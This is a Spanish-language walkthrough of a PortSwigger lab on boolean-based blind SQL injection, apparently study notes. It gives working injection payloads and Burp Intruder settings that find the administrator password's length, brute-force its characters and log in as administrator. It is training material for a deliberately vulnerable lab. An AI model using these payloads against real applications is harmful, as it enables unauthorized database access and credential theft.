# SQL Injection with Conditional Responses

## 📌 Lab Information

- **Lab:** SQL Injection with Conditional Responses
- **Categoría:** Blind SQL Injection
- **Técnica:** Boolean-Based SQLi

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

---

## 🎯 Objetivo

Explotar una vulnerabilidad Blind SQL Injection para obtener la contraseña del usuario `administrator`.

---

## 🔍 Interceptando la petición

Abrimos Burp Suite y activamos el proxy.

![Burp Proxy](./Imagenes/pasted-image-20260406123145.png)

Enviamos la petición al módulo Repeater con:

```text
CTRL + R
```

![Repeater](./Imagenes/pasted-image-20260406123205.png)

---

## 🔍 Identificación de respuestas válidas

Cuando la condición es correcta, el servidor responde con:

```text
Welcome Back
```

![Welcome Back](./Imagenes/pasted-image-20260406123252.png)

---

## 🚀 Validación SQL Injection

Payload:

```sql
' OR 1=1 -- -
```

Debemos URL Encodear el payload utilizando:

```text
CTRL + U
```

![Payload URL Encode](./Imagenes/pasted-image-20260406123423.png)

---

## 🔍 Validando existencia del usuario administrator

```sql
' union select username from users where username='administrator' -- -
```

![Validación usuario](./Imagenes/pasted-image-20260406123621.png)

---

# 🚀 Enumeración del largo de la password

Payload:

```sql
' union select username from users where username='administrator' and length(password)=1 -- -
```

Enviamos la petición a Intruder:

```text
CTRL + I
```

![Intruder](./Imagenes/pasted-image-20260406125122.png)

---

## ⚙️ Configuración Intruder

Tipo de ataque:

```text
Sniper
```

![Sniper](./Imagenes/pasted-image-20260406125136.png)

---

## 🔍 Configuración payloads

- Tipo: Numbers
- From: 1
- To: 30

![Payload Numbers](./Imagenes/pasted-image-20260406125233.png)

---

## 🔍 Grep Match

Agregamos:

```text
Welcome Back
```

![Grep Match](./Imagenes/pasted-image-20260406125345.png)

---

## ✅ Resultado

La contraseña tiene:

```text
20 caracteres
```

![Length Password](./Imagenes/pasted-image-20260406125602.png)

---

# 🚀 Fuerza bruta carácter por carácter

Payload:

```sql
' union select username from users where username='administrator' and substring(password,1,1)='a' -- -
```

---

## ⚙️ Configuración Cluster Bomb

Tipo de ataque:

```text
Cluster Bomb
```

![Cluster Bomb](./Imagenes/pasted-image-20260406165808.png)

---

## 🔍 Payload posición

Payload 1:
- Numbers
- 1 → 20

![Payload Position](././Imagenes/pasted-image-20260406170349.png)

---

## 🔍 Payload caracteres

Payload 2:
- Brute Forcer

![Payload Characters](./Imagenes/pasted-image-20260406170510.png)

---

## ✅ Enumeración

![Enumeración Password](./Imagenes/pasted-image-20260407004024.png)

---

## 🔓 Acceso administrador

![Login exitoso](./Imagenes/pasted-image-20260407004121.png)

---

## ✅ Resultado

Se logró:
- Enumerar longitud
- Enumerar caracteres
- Extraer password
- Acceder como administrator
